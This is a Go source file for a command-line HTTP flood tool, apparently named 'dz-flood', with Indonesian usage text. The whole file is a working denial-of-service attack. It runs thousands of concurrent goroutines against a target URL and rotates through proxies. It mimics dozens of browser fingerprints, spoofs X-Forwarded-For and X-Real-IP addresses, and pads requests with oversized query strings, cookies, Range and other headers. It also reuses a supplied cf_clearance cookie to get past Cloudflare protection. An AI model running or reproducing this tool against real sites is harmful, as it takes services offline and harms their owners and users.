package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk        = 1500
	to         = 5 * time.Second
	sub        = 5
	KEEP_ALIVE = 30 * time.Second
)

type BrowserProfile struct {
	UA          string
	Accept      string
	Lang        string
	Encoding    string
	SecChUa     string
	SecChUaMov  string
	SecChUaPlat string
	Refs        []string
}

var (
	refChrome    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
	refFirefox   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="}
	refEdge      = []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="}
	refSafari    = []string{"https://www.google.com/search?q="}
	refOpera     = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p=", "https://www.bing.com/search?q="}
	refBrave     = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refVivaldi   = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q=", "https://www.duckduckgo.com/?q="}
	refTor       = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
	refPaleMoon  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refWaterfox  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refEpic      = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refSlim      = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
	refMaxthon   = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
	refAvant     = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
	refSeaMonkey = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refIceDragon = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refCyberfox  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refSamsung   = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
	refDuckGo    = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
	refOperaMini = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p="}
	refFFMobile  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refBraveMob  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refEpiphany  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refMidori    = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refKonqueror = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
	refFalkon    = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
)

var profiles = []BrowserProfile{
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refChrome,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refFirefox,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refEdge,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refOpera,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Brave/144.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Brave";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refBrave,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Vivaldi/7.1.3570.47",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Vivaldi";v="7.1", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refVivaldi,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/131.0.0.0 (Edition GX)",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Opera GX";v="131", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refOpera,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Arc/1.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Arc";v="1", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refChrome,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 TorBrowser/12.5.3",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refTor,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Goanna/6.4 Firefox/68.0 PaleMoon/33.5.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refPaleMoon,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 Waterfox/6.5.2",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refWaterfox,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Epic/146.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Epic";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refEpic,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 SlimBrowser/15.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "SlimBrowser";v="15", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refSlim,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Maxthon/7.1.9.3000",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Maxthon";v="7.1", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refMaxthon,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Avant/2024.1.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Avant";v="2024", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        refAvant,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 SeaMonkey/2.53.19",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refSeaMonkey,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 IceDragon/115.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refIceDragon,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 Cyberfox/52.9.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refCyberfox,
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
		Refs:        refChrome,
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/123.0.0.0 Mobile Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="123", "Samsung Internet";v="25", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
		Refs:        refSamsung,
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) DuckDuckGo/5.0 Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "DuckDuckGo";v="5", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
		Refs:        refDuckGo,
	},
	{
		UA:          "Opera/9.80 (Android; Opera Mini/18.0.2254/93.577; U; en) Presto/2.12.423 Version/12.16",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refOperaMini,
	},
	{
		UA:          "Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refFFMobile,
	},
	{
		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36 Brave/146.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="146", "Brave";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?1",
		SecChUaPlat: "Android",
		Refs:        refBraveMob,
	},
	{
		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refSafari,
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refSafari,
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/136.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refFirefox,
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Brave/145.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Brave";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "macOS",
		Refs:        refBrave,
	},
	{
		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Vivaldi/7.2.3622.47",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Vivaldi";v="7.2", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "macOS",
		Refs:        refVivaldi,
	},
	{
		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Google Chrome";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Linux",
		Refs:        refChrome,
	},
	{
		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Falkon/24.08.3 QtWebEngine/6.7.2 Safari/538.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refFalkon,
	},
	{
		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Epiphany/45.3 Safari/605.1.15",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refEpiphany,
	},
	{
		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Midori/11.3 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refMidori,
	},
	{
		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) Konqueror/4.14.38 Safari/537.21",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        refKonqueror,
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

var customCookie string

func main() {
	log.SetOutput(io.Discard)

	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}

	var proxies []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	wcs := make([]CLI, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: KEEP_ALIVE,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           50000,
			MaxIdleConnsPerHost:    50000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        KEEP_ALIVE,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    false,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 3 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Author : Diz Flyze\n")
	fmt.Printf("ޗ | Target : %s\n", tgt)
	fmt.Printf("ޗ | Time   : %d/s\n", dur)
	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
	fmt.Printf("ޗ | Conc   : %d\n", wrk)
	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
	fmt.Printf("ޗ | Ulimit : 1048576\n")
	if customCookie != "" {
		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
	} else {
		fmt.Printf("ޗ | Cookie : False\n")
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func(subID int) {
					defer swg.Done()
					subRng := rand.New(rand.NewSource(rng.Int63()))

					for ctx.Err() == nil {
						prof := profiles[subRng.Intn(len(profiles))]

						reqURL := tgt

						param := CBP[subRng.Intn(len(CBP))]
						if strings.Contains(reqURL, "?") {
							reqURL += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						} else {
							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						}

						reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
						if subRng.Intn(2) == 0 {
							reqURL += "&" + RST(subRng, 16) + "=" + strings.Repeat("x", 2048+subRng.Intn(2048))
						}

						req, _ := http.NewRequest("GET", reqURL, nil)

						headerMap := make(map[string]string)

						headerMap["User-Agent"] = prof.UA
						headerMap["Accept"] = prof.Accept
						headerMap["Accept-Language"] = prof.Lang
						headerMap["Accept-Encoding"] = prof.Encoding
						headerMap["Connection"] = "keep-alive"

						ref := prof.Refs[subRng.Intn(len(prof.Refs))]
						ref += RST(subRng, 20) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
						headerMap["Referer"] = ref

						pid := cli.ip
						if pid == "" {
							pid = RIP(subRng)
						}
						if subRng.Intn(2) == 0 {
							headerMap["X-Forwarded-For"] = pid + ", " + RIP(subRng) + ", " + RIP(subRng)
						} else {
							headerMap["X-Forwarded-For"] = pid
						}
						headerMap["X-Real-IP"] = pid

						start := subRng.Intn(10000)
						end := start + 10000000 + subRng.Intn(50000000)
						headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
						if subRng.Intn(2) == 0 {
							headerMap["If-Range"] = `"` + RST(subRng, 20) + `"`
						} else {
							past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
							headerMap["If-Range"] = past
						}

						size := 4096 + subRng.Intn(4096)
						headerMap["X-Large-Data"] = strings.Repeat("x", size)

						cookieParts := []string{"big=" + strings.Repeat("x", 2048+subRng.Intn(2048))}
						if customCookie != "" {
							cookieParts = append(cookieParts, customCookie)
						}
						for _, name := range COOKIES {
							if subRng.Intn(2) == 0 {
								cookieParts = append(cookieParts, name+"="+strconv.FormatInt(subRng.Int63(), 16))
							}
						}
						if len(cookieParts) > 0 {
							headerMap["Cookie"] = strings.Join(cookieParts, "; ")
						}

						if prof.SecChUa != "" {
							headerMap["Sec-Ch-Ua"] = prof.SecChUa
							headerMap["Sec-Ch-Ua-Mobile"] = prof.SecChUaMov
							headerMap["Sec-Ch-Ua-Platform"] = prof.SecChUaPlat
						}
						headerMap["Sec-Fetch-Site"] = "none"
						headerMap["Sec-Fetch-Mode"] = "navigate"
						headerMap["Sec-Fetch-Dest"] = "document"

						if subRng.Intn(2) == 0 {
							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
						}
						if subRng.Intn(3) == 0 {
							headerMap["X-Original-URL"] = "/" + RST(subRng, 20)
						}
						if subRng.Intn(3) == 0 {
							headerMap["X-Forwarded-Host"] = RST(subRng, 10) + ".example.com"
						}

						for k, v := range headerMap {
							req.Header.Set(k, v)
						}

						resp, err := cli.client.Do(req)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}(s)
			}
			swg.Wait()
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
